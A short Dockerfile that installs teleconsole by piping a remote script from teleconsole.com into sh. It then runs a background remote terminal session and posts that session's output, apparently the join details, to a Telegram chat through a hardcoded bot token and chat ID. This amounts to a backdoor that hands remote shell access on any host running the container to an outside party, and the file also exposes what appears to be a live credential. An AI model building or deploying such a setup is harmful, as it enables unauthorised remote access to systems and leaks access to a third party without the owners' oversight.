FROM ubuntu:latest

# Set user to root

USER root

# Update packages and install curl

RUN apt-get update -y && apt-get install -y curl

# Download and install teleconsole

RUN curl https://www.teleconsole.com/get.sh | sh

# Set the TELEGRAM_TOKEN and TELEGRAM_CHAT_ID environment variables

ENV TELEGRAM_TOKEN="6229604606:AAFdbXmBv62xlCbZSiMTfRVGpLQ-2mEqDO8"

ENV TELEGRAM_CHAT_ID="5149523544"

# Create a script to run teleconsole in the background and send output to Telegram

RUN echo '#!/bin/bash' > /teleconsole \

    && echo 'nohup teleconsole > /tmp/teleconsole_output.txt 2>&1 &' >> /teleconsole \

    && echo 'sleep 5' >> /teleconsole \

    && echo 'curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" -d "chat_id=$TELEGRAM_CHAT_ID" -d "text=$(cat /tmp/teleconsole_output.txt)"' >> /teleconsole \

    && chmod +x /teleconsole

# Start the teleconsole and send output to Telegram

CMD ["/bin/bash", "-c", "/teleconsole"]
